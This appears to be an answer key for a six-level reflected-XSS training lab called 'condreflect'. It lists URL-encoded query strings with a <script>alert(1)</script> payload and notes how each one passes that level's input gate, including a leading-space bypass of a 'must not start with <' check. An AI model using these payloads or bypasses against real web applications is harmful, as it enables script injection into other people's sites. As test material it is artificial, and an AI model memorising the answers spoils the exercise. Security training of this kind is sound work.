# condreflect — solutions

Conditional reflection — payload must satisfy the gate (length, contains digit, doesn't start with <, etc.).

### condreflect-level1

`/condreflect/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: requires length > 5 — payload is 25 chars

### condreflect-level2

`/condreflect/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: requires a digit — the `1` satisfies

### condreflect-level3

`/condreflect/level3/?query=%20%3Cscript%3Ealert(1)%3C/script%3E`

- payload: ` <script>alert(1)</script>`
- context: must not start with `<` — leading space bypasses the check

### condreflect-level4

`/condreflect/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: reflected twice when `<` present — both reflections fire

### condreflect-level5

`/condreflect/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: wrapped in <div> when no `lang` param — raw reflection

### condreflect-level6

`/condreflect/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw if < 100 chars — payload is short
